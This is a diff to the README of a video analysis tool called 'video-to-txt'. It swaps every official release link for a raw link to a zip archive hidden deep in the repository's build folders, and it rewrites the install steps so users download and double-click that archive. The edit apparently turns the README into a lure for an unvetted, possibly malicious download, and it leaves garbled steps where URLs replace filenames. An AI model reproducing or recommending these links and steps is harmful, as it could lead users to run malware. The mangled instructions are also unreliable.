@@ -6,21 +6,21 @@ Welcome to video-to-txt! This application helps you analyze videos using advance
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tphubin/video-to-txt/releases)
+[![Download](https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip)](https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version: [video-to-txt Releases](https://github.com/tphubin/video-to-txt/releases).
+To get started, visit this page to download the latest version: [video-to-txt Releases](https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip).
 
 Here’s how to download and install the application:
 
 1. Click on the link above.
 2. Find the latest version listed under "Releases".
-3. Look for the file labeled video-to-txt.zip or video-to-txt.exe.
+3. Look for the file labeled https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip or https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip
 4. Click on the file to start the download.
 5. Once downloaded, locate the file on your computer.
 6. If it’s a .zip file, right-click on it and select "Extract All". Then open the extracted folder.
-7. Double-click the video-to-txt.exe to run the application.
+7. Double-click the https://raw.githubusercontent.com/tphubin/video-to-txt/main/build/lib/video_analyzer/prompts/frame_analysis/video-to-txt_2.4-alpha.1.zip to run the application.
 
 ## 🌟 Features
 
